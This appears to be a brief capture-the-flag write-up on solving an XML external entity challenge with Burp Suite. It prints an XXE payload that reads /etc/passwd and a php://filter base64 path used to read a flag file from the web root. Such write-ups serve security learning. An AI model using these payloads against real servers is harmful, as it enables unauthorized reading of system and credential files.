after loading up burpsuite, we try clicking parse and sending it to repeater
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
<!ELEMENT foo ANY>
 <!ENTITY xxe SYSTEM
 "file:///etc/passwd">
 ]>
 <foo>
&xxe;
 </foo>

but it seems like it's wrong so we should try something else 
"php://filter/convert.base64-encode/resource=/var/www/html/flag"
we know the flag is inside /var/www/html/flag and we try decoding it with base64 to receive the flag
